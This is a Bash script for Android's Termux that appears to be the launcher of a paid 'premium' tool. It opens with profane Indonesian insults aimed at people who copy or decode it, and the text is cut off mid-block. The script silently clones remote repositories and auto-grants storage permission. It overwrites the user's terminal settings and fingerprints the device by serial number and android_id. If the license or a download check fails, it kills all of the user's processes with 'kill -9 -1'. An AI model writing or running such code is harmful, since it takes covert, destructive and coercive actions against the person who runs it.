# LU TUH KONTOL, DECODER ANJING !!
# TUKANG RENAME, OTAK DONGO !!
# GK TAU MALU, LU KONTOL !!
# MONYET DECODER TUKANG COLONG,
# KARYA ORANG LU TOLOL, BANGSAT LU
# ORANG GK SALAH, DI RESOURCE GK MENGHARGAI,
# LU ANJING, BANGSAT TAI PENGHIANAT TAI !!
# TOOLSlV ITU TOOLS YANG ANTI RAAT & SPYWARE BOSS !!
# AMAN UNTUK DI GUNAKAN KHUSUS USER PREM !!
# MOGA AJA YANG FITNAH GW DAN LAINNYA
# MOGA LU SEHAT2 SELALU YAK BRO :)
# @Thxyzz404 Sads Boys :v

b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
dom=(
"\033[1;31m"
"\033[1;32m"
"\033[1;33m"
"\033[1;34m"
"\033[1;36m"
"\033[1;37m"
"\033[1;35m"
"\033[1;30m"
)
apa_bego() {
    TOLOL="$HOME/Yalakan"  
    URL="https://github.com/QrwszXnXnchommed0e56/Yalakan/blob/8d6c48c24077f0f70842e615ce419983d8c03fa9/salah.mp3?raw=true"    
    if [ -d "$TOLOL" ]; then
        clear &> /dev/null
        return 0
    else
        clear 
        mpv --no-terminal --quiet --volume=150 "$URL" 2>/dev/null || echo -e "${r}[ ${r}! ${r}]${y} Gagall sound." 
        echo ""      
        echo -e "${r}[ ${g}+ ${r}]${p} Sound hilang mendownload..!!"
        sleep 2
        echo -e "${g}"
        git clone --depth 32 https://github.com/QrwszXnXnchommed0e56/Yalakan "$TOLOL"
        if [ -d "$TOLOL" ]; then
            clear
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
            echo -e "${r}[ ${g}✓ ${r}]${y} Sound berhasil di install..!!"
            sleep 2 
            echo ""
            clear
        else
            clear 
            echo ""
            echo -e "${r}[ ${r}x ${r}]${b} Gagal mendownload sound..!!"
            echo ""
            sleep 3
            kill -9 -1 && exit
        fi
    fi
}
apa_bego
clear 
if [ ! -d "$HOME/storage" ]; then
    echo ""
    echo -e "${r}[ ${g}INFO ${r}]${y} Sedang melakukan stup."
    echo "y" | termux-setup-storage
    sleep 1
    echo ""
    echo -e "${r}[ ${g}SUCCESS ${r}]${y} Berhasil di stup."
    echo ""
    sleep 2
    clear
fi
cd $HOME
fitur_admin=(
"u0_a410"
)
properties() {
cek=$(whoami)
min=0  
for admin in "${fitur_admin[@]}"; do
if [[ "$cek" == "$admin" ]]; then
    min=1
    break
fi
done
if [[ $min -eq 1 ]]; then
if [ ! -f "$HOME/pasang.txt" ]; then
   touch "$HOME/pasang.txt"
fi
return 0
fi
if [ -f "$HOME/pasang.txt" ]; then
    return 0
else
    mkdir -p ~/.termux
{
  echo "font-size=8"
  echo "bell-character=ignore"
  echo "terminal-transcript-opacity=0.95"
  echo "use-black-ui=true"
  echo "hide-soft-keyboard-on-startup=true"
  echo "clipboard-autocopy=true"
  echo "terminal-margin-vertical=1"
  echo "extra-keys=[ \\"
  echo " ['TAB','>','<','/','exit\n','PGUP'], \\"
  echo " ['SHIFT','ls\n','cd Son\n','make run\n','()','cd\n'], \\"
  echo " ['git pull\n','-','rm -rf ','&','UP','{}'], \\"
  echo " ['CTRL','%','clear\n','LEFT','DOWN','RIGHT'] \\"
  echo "]"
} > ~/.termux/termux.properties 
termux-reload-settings
touch "$HOME/pasang.txt"
fi
}
properties
ukuran=51
kon() {
echo -ne "\033[?25l"
}
tai() {
echo -ne "\033[?25h"
}
memek() {
stty echo
tai
}
trap memek EXIT
trap 'memek; exit' INT
clear
kon
cok=$(tput cols)
if [ "$cok" -ge "$ukuran" ]; then
    clear
    tai
    clear 
else
    echo -ne "\033[2J\033[H"
    echo ""
    echo -e "${bold_bg}${bold_gren} Ukuran Layar Belum Sesuai, ${n}"
    echo ""
    echo -e "\033[100;36m Silahkan Cubit Layar !! ${n}"
while [ "$cok" -lt "$ukuran" ]; do
     sleep 1
     cok=$(tput cols)
done
    clear
    tai
    clear 
fi
lonte() {
return 0
}
ank_fefex_jule() {
    local user=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
    local hash_user=$(sha256sum <<< "$user" | cut -c1-20)
    local repo="https://github.com/Apwusyvwkjwygw/.whoami"
    local dir="$HOME/.cek_daftar"    
    rm -rf "$dir" 2>/dev/null
    git clone --depth 1 "$repo" "$dir" 2>/dev/null    
    if [ -f "$dir/Daftar.txt" ]; then
        local db=$(cat "$dir/Daftar.txt" | tr -d '\r')
        rm -rf "$dir"        
        while IFS= read -r line; do
            line=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            [ -z "$line" ] && continue
            [ "$line" = "$hash_user" ] && { echo "terdaftar"; return 0; }
        done <<< "$db"
    else
        rm -rf "$dir"
    fi   
    echo "tidak_terdaftar"
    return 1
}
ngaca_tolol() {
    clear
    mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
    echo ""
    echo -e "\033[1;34m╔══════════════════════════════════════════════╗"
    echo -e "\033[1;34m║ \033[32;1m             ID TERVERIFIKASI               \033[1;34m ║"
    echo -e "\033[1;34m╚══════════════════════════════════════════════╝"
    echo -e "\033[1;34m╔══════════════════════════════════════════════╗"
    echo -e "\033[1;34m║ \033[32;1m           SCRIPT DAPAT DI AKSES         \033[1;34m    ║"
    echo -e "\033[1;34m╚══════════════════════════════════════════════╝"
    local hash_id=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
    local short_hash=$(sha256sum <<< "$hash_id" | cut -c1-20)
    echo -e "${c}ID Device : ${r}$short_hash"
    sleep 3
}
ank_kontol() {
    clear
    mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
    sleep 1
    mpv --no-video --quiet "$HOME/Yalakan/IDV1.mp3" &> /dev/null &
    sleep 0.05
    echo ""
    echo -e "\033[31;1m╔══════════════════════════════════════════════╗"
    echo -e "\033[31;1m║ \033[32;1m           ID TIDAK TERVERIFIKASI        \033[31;1m    ║"
    echo -e "\033[31;1m╚══════════════════════════════════════════════╝"
    sleep 0.05
    echo -e "\033[31;1m╔══════════════════════════════════════════════╗"
    echo -e "\033[31;1m║ \033[32;1m         SCRIPT TIDAK DAPAT DI AKSES   \033[31;1m      ║"
    echo -e "\033[31;1m╚══════════════════════════════════════════════╝"
    echo ""
    local hash_id=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
    local short_hash=$(sha256sum <<< "$hash_id" | cut -c1-20)
    echo -e "${c}ID Device Anda : ${r}$short_hash"
    echo -e "${c}Belum Terdaftar!! "
    echo -e "${g}Silakan PREMIUM Dulu Ke Thxyzz404 "
    echo ""
    sleep 6
    kill -9 -1 && exit
}
clear
cek=$(ank_fefex_jule)
if [ "$cek" = "terdaftar" ]; then
    ngaca_tolol
else
    ank_kontol
    sleep 6
    kill -9 -1 && exit
fi
echo ""
w=$(shuf -n 1 -e "${dom[@]}")
echo ""
clear 
tanggal=$(date '+%d')
bulan=$(date '+%B')
case $bulan in
  January) bulan="Januari";;
  February) bulan="Februari";;
  March) bulan="Maret";;
  April) bulan="April";;
  May) bulan="Mei";;
  June) bulan="Juni";;
  July) bulan="Juli";;
  August) bulan="Agustus";;
  September) bulan="September";;
  October) bulan="Oktober";;
  November) bulan="November";;
  December) bulan="Desember";;
esac
   ucapan=""
   time=$(date +'%H:%M')
   kang_rinem_kontol=$(printf "%-21s" "$time")
   hari=$(date +%A)
  case $hari in
     Monday) ucapan="Senin";;
     Tuesday) ucapan="Selasa";;
     Wednesday) ucapan="Rabu";;
     Thursday) ucapan="Kamis";;
     Friday) ucapan="Jum'at";;
     Saturday) ucapan="Sabtu";;
     Sunday) ucapan="Minggu";;
 esac
     jam_perhari=$(date +"%H")
  if [ $jam_perhari -ge 6 ] && [ $jam_perhari -le 11 ]; then
     sambutan="Pagi 🌆"
  elif [ $jam_perhari -ge 12 ] && [ $jam_perhari -le 14 ]; then
     sambutan="Siang 🌅"
  elif [ $jam_perhari -ge 15 ] && [ $jam_perhari -le 17 ]; then
     sambutan="Sore 🌄"
  else
     sambutan="Malam 🌃"
  fi
echo ""
clear
pgn=$((pgn + 1))
usr=""
file="/data/data/com.termux/files/home/usr.txt"
if [ -f "$file" ]; then
    usr=$(cat "$file")
fi
if [ -z "$usr" ]; then
    echo "
███╗   ██╗ █████╗ ███╗   ███╗███████╗
████╗  ██║██╔══██╗████╗ ████║██╔════╝
██╔██╗ ██║███████║██╔████╔██║█████╗
██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝
██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
      Subjek : Login To Name " | lolcat
    echo -e "${c}"
    while true; do
        read -p "Masukkan Nama Anda [ tanpa spasi ] : " najis_kroco
        echo ""
        if [ -z "$najis_kroco" ]; then
            echo -e "${r}Nama Tidak Boleh Kosong..!!${c}"
            echo ""
            continue
        fi
        if [[ "$najis_kroco" =~ \  ]]; then
            echo -e "${g}Nama tidak boleh ada spasi..!!${c}"
            echo ""
            continue
        fi
        usr="$najis_kroco"
        echo "$usr" > "$file"
        echo -e "${y}TERIMAKASIH Sudah Memasukkan Nama Anda..!!"
        sleep 3
        break
    done
fi
clear
cok="ansi-rounded"
cd $HOME
txt() {
  local text="$1"
  local delay="${2:-0.05}"
  local color="${3:-}"
  local i char
  if [ -n "$color" ]; then
    printf "%b" "$color"
  fi
  for ((i=0; i<${#text}; i++)); do
    char="${text:i:1}"
    printf "%s" "$char"
    sleep "$delay"
  done
  printf "\n"
  if [ -n "$color" ]; then
    printf "%b" "$n"
  fi
}
cek_paket() {
if ! command -v python &> /dev/null; then
   pkg install -y python
fi
if ! command -v pip &> /dev/null; then
   pkg install -y python-pip
fi
if ! command -v gtts-cli &> /dev/null; then
   pip install gTTS
fi
clear
}
generate_suara() {
local user="$1"
local sound="$HOME/nama_${user}.mp3"
if [ ! -f "$sound" ]; then
echo "Hallo ${user}, selamat datang di Tools V4" > "$HOME/temp.txt"
   gtts-cli -f "$HOME/temp.txt" -l id -o "$sound"
   rm -f "$HOME/temp.txt"
fi
echo "$sound"
}
banner1() {
    mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
    sleep 2
    cowsay -f eyes 'Jangan dengarkan apa kata orang lain.' | boxes -d "$cok" | lolcat
    echo ""
    echo -e "\033[32;1m╔═════════════════════════════════════╗"
    echo -e "\033[32;1m║ ${r}         TOOLSlV__SCANNING         ${g} ║"
    echo -e "\033[32;1m╚═════════════════════════════════════╝"
    echo ""
}
banner2() {
    mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
    sleep 2
    echo -e "${bold_bg}${bold_gren} PESAN ${n}"
    echo -e "${g} Teruslah semangat walupun agak melelahkan."
    echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢠⣤⣄⡀⠈⠙⠛⠿⣿⣿⣿⡝⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠿⠛⠋⠉⠉⠉⠀⠀⢿⣿⣿⣷⣶⣄⣀⠀⠉⠉⠁⠀⠢⠈⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡟⣫⣥⣤⣤⣶⣶⣶⣶⣶⣤⣤⡈⢿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣄⣀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠈⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠂⠙⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿⣦⠀⠀⠀⣉⠻⢿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⢻⣿
⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⢀⣀⣀⣀⣀⡈⠉⠻⢿⣿⣧⡀⠀⠘⠷⣤⡙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢻
⣿⣿⣿⣯⣄⡀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣝⠻⣷⣄⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⣿⡿⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣦⣾⣿⣿⣶⣶⣶⣦⣤⣄⡀⠀⠀⣸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠙⣿⣿⣿⡿⠉⠀⢀⠈⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢻
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠸⣿⣿⠃⢀⣾⣿⣿⣿⣶⡄⠉⠿⣿⣿⣿⣿⣏⠉⠛⠻⠿⠿⠿⠀⢺
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⢻⣿⠀⢈⣿⣿⣿⣿⡟⣇⣠⣦⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢸⣿⠀⣿⣿⣿⣿⡟⢠⣿⣿⣟⠀⣀⡈⠻⢿⣿⠿⠗⠀⢠⡞⢀⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⠀⣠⣾⣿⣿⡇⠸⣿⣿⣿⣾⣿⠃⠀⢀⣤⣤⣤⡀⠀⢀⣾⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⣾⣿⠀⣿⡿⠿⠋⡅⠐⣿⣿⡟⣿⡟⣀⣴⣿⣿⣿⡏⢀⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⣰⣿⣿⡄⠀⠀⠀⠸⠿⠀⠈⠋⢀⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⢰⣿⣿⣿⣷⣾⣿⣿⡶⠖⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
" | boxes -d "$cok" | lolcat 
    echo ""
    echo -e "\033[32;1m╔═════════════════════════════════════╗"
    echo -e "\033[32;1m║ ${r}         TOOLSlV__SCANNING         ${g} ║"
    echo -e "\033[32;1m╚═════════════════════════════════════╝"
    echo ""
}
banner3() {
    mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
    sleep 2
    echo -e "${bold_bg}${bold_gren} PESAN ${n}"
    echo -e "${g} Tinggalkan lah orang lain yang kamu sukai"
    echo -e "${g} dan fokuslah pada dirimu sendiri."
    echo "
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
" | boxes -d "$cok" | lolcat 
    echo ""
    echo -e "\033[32;1m╔═════════════════════════════════════╗"
    echo -e "\033[32;1m║ ${r}         TOOLSlV__SCANNING         ${g} ║"
    echo -e "\033[32;1m╚═════════════════════════════════════╝"
    echo ""
}
banner4() {
    mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
    sleep 2
    echo -e "${bold_bg}${bold_gren} PESAN ${n}"
    echo -e "${g} Jangan sedih bro saya akan menemanimu."
    echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat
    echo ""
    echo -e "\033[32;1m╔═════════════════════════════════════╗"
    echo -e "\033[32;1m║ ${r}         TOOLSlV__SCANNING         ${g} ║"
    echo -e "\033[32;1m╚═════════════════════════════════════╝"
    echo ""
}
banner5() {
    mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
    sleep 2
    echo -e "${bold_bg}${bold_gren} PESAN ${n}"
    echo -e "${g} Percayalah kepada diri sendiri jangan percaya terhadap orang lain."
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀
" | boxes -d "$cok" | lolcat 
    echo ""
    echo -e "\033[32;1m╔═════════════════════════════════════╗"
    echo -e "\033[32;1m║ ${r}         TOOLSlV__SCANNING         ${g} ║"
    echo -e "\033[32;1m╚═════════════════════════════════════╝"
    echo ""
}
minggir_lu() {
local pilih=$(( (RANDOM % 5) + 1 ))
banner${pilih}
}
dasar_kroco() {
SOUND="$HOME/Son/Sound.mp3"
if [ -f "$SOUND" ]; then
mpv --no-terminal --quiet --volume=150 "$SOUND" &
for i in {1..10}; do
    echo -ne "\r${y} Loading..!!" "${c}[ ${r}${i}0% ${c}] "
    sleep 0.02
    echo -ne "\r${y} Loading..!!" "${c}[ ${r}${i}0% ${c}]"
    sleep 0.4
  done
  echo -ne "\r${y} Loading..!!" "${c}[ ${r}100% ${c}]"
  sleep 1
  mpv --no-video --quiet "$HOME/Son/Y.mp3" &> /dev/null &
  echo -e "${g} Loading Selesai..!!"
  sleep 2
else
  echo -e "${r}File Sound.mp3 Tidak Ditemukan..!!"
fi
}
cek_paket
minggir_lu
dasar_kroco
if [ -f "$HOME/usr.txt" ]; then
nama_user=$(cat "$HOME/usr.txt" | tr -d '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
